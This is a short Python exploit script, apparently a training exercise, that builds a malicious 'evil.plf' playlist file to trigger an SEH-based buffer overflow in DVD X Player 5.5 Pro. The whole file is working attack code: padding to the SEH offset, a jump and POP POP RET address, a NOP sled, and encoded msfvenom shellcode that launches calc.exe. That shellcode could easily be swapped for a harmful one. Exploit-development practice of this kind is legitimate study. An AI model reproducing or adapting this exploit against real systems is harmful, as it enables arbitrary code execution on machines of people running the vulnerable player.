#!/usr/bin/python

# Author: Michael Music
# Date: 3/11/2019
# Description: DVD X Player 5.5 Pro SEH based BOF
#  Exercise in SEH based BOFs given PoC code

filename = "evil.plf"

# POP POP RET at 0x64103794
# nSEH at offset 608
# SEH at 612

buf = ''
buf += 'A' * 608
buf += '\xEB\x08\x90\x90' # JMP 8 bytes opcode
buf += '\x94\x37\x10\x64' # POP POP RET address to load into EIP
buf += '\x90' * 30

# msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python -e x86/alpha_mixed
buf += "\x89\xe0\xdb\xda\xd9\x70\xf4\x59\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37"
buf += "\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += "\x50\x38\x41\x42\x75\x4a\x49\x39\x6c\x69\x78\x4e\x62"
buf += "\x53\x30\x67\x70\x47\x70\x45\x30\x4d\x59\x69\x75\x35"
buf += "\x61\x6f\x30\x61\x74\x4e\x6b\x72\x70\x54\x70\x4c\x4b"
buf += "\x51\x42\x34\x4c\x4c\x4b\x32\x72\x32\x34\x4e\x6b\x63"
buf += "\x42\x77\x58\x56\x6f\x4d\x67\x42\x6a\x55\x76\x75\x61"
buf += "\x49\x6f\x4e\x4c\x47\x4c\x51\x71\x73\x4c\x64\x42\x54"
buf += "\x6c\x57\x50\x69\x51\x68\x4f\x54\x4d\x75\x51\x48\x47"
buf += "\x68\x62\x5a\x52\x50\x52\x76\x37\x4c\x4b\x51\x42\x76"
buf += "\x70\x4c\x4b\x43\x7a\x35\x6c\x6e\x6b\x42\x6c\x46\x71"
buf += "\x31\x68\x6d\x33\x52\x68\x55\x51\x6e\x31\x33\x61\x6c"
buf += "\x4b\x70\x59\x37\x50\x57\x71\x79\x43\x6c\x4b\x62\x69"
buf += "\x72\x38\x7a\x43\x55\x6a\x70\x49\x6c\x4b\x76\x54\x6c"
buf += "\x4b\x43\x31\x4e\x36\x76\x51\x49\x6f\x4e\x4c\x79\x51"
buf += "\x5a\x6f\x66\x6d\x76\x61\x4f\x37\x44\x78\x4b\x50\x62"
buf += "\x55\x7a\x56\x65\x53\x71\x6d\x69\x68\x75\x6b\x73\x4d"
buf += "\x54\x64\x52\x55\x79\x74\x53\x68\x6e\x6b\x50\x58\x46"
buf += "\x44\x55\x51\x49\x43\x75\x36\x6c\x4b\x76\x6c\x72\x6b"
buf += "\x4c\x4b\x50\x58\x77\x6c\x66\x61\x49\x43\x6e\x6b\x44"
buf += "\x44\x6c\x4b\x63\x31\x48\x50\x4b\x39\x77\x34\x55\x74"
buf += "\x54\x64\x31\x4b\x71\x4b\x55\x31\x70\x59\x51\x4a\x63"
buf += "\x61\x39\x6f\x59\x70\x71\x4f\x61\x4f\x70\x5a\x4c\x4b"
buf += "\x56\x72\x78\x6b\x6e\x6d\x53\x6d\x61\x7a\x37\x71\x6e"
buf += "\x6d\x4c\x45\x68\x32\x55\x50\x67\x70\x45\x50\x52\x70"
buf += "\x53\x58\x50\x31\x6c\x4b\x32\x4f\x6b\x37\x69\x6f\x49"
buf += "\x45\x6d\x6b\x68\x70\x38\x35\x39\x32\x30\x56\x73\x58"
buf += "\x6d\x76\x5a\x35\x4f\x4d\x6d\x4d\x49\x6f\x78\x55\x47"
buf += "\x4c\x63\x36\x31\x6c\x35\x5a\x6d\x50\x6b\x4b\x49\x70"
buf += "\x73\x45\x67\x75\x4f\x4b\x37\x37\x35\x43\x30\x72\x52"
buf += "\x4f\x70\x6a\x47\x70\x52\x73\x6b\x4f\x4e\x35\x42\x43"
buf += "\x53\x51\x32\x4c\x45\x33\x56\x4e\x51\x75\x61\x68\x52"
buf += "\x45\x35\x50\x41\x41"

buf += 'A' * (2000 - len(buf))

textfile = open(filename, 'w')
textfile.write(buf)
textfile.close()
